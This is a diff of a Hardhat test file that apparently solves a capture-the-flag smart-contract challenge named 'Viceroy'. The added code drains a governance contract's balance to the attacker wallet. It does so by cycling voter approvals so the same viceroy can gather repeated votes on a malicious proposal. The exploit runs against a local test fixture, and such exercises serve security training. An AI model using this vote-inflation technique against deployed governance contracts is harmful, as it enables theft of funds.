@@ -2,6 +2,7 @@ const { expect, use } = require("chai")
 const { ethers } = require("hardhat")
 const { BigNumber } = ethers
 const helpers = require("@nomicfoundation/hardhat-network-helpers")
+const { toUtf8Bytes } = require("ethers/lib/utils")
 
 use(require("chai-as-promised"))
 
@@ -40,7 +41,45 @@ describe("Viceroy", async function () {
 
   // prettier-ignore;
   it("conduct your attack here", async function () {
-    await attacker.attack(governance);
+    const [, , ...signers] = await ethers.getSigners();
+
+    // attacker appointViceroy to an EOA
+    // viceroy approveVoter 5x (other EOA)
+    // voter create proposal(data = abi.encodeFunctionWithSignature(exec())) & voteOnProposal
+    // viceroy disapproveVoter & reapprove another 5 voter
+    // call executeProposal to send all the balance of governance to attacker
+    await attacker.attack(governance.address, signers[0].address);
+    for (let i =1; i<6; i++){
+      await governance.connect(signers[0]).approveVoter(signers[i].address);
+    }
+    console.log("viceroy appointment",await governance.viceroys(signers[0].address))
+    let ABI = ["function exec(address target, bytes calldata data, uint256 value) external"];
+    let iface = new ethers.utils.Interface(ABI);
+    const proposalData = iface.encodeFunctionData("exec", [attackerWallet.address,"0x00", BigNumber.from("10000000000000000000")]);
+
+    // equivalent to uint256(keccak256(proposalData))
+    const proposalId = ethers.BigNumber.from(ethers.utils.keccak256(proposalData));
+
+    await governance.connect(signers[0]).createProposal(signers[0].address, proposalData.toString());
+  
+    for (let i =1; i<6; i++){
+      await governance.connect(signers[i]).voteOnProposal(proposalId,true,signers[0].address);
+    }
+    for (let i =1; i<6; i++){
+      await governance.connect(signers[0]).disapproveVoter(signers[i].address);
+    }
+    
+    for (let i =1; i<6; i++){
+      await governance.connect(signers[0]).approveVoter(signers[i+5].address);
+    }
+
+       
+    for (let i =1; i<6; i++){
+      await governance.connect(signers[i+5]).voteOnProposal(proposalId,true,signers[0].address);
+    }
+   
+    await governance.connect(signers[0]).executeProposal(proposalId);
+    
   });
 
   after(async function () {
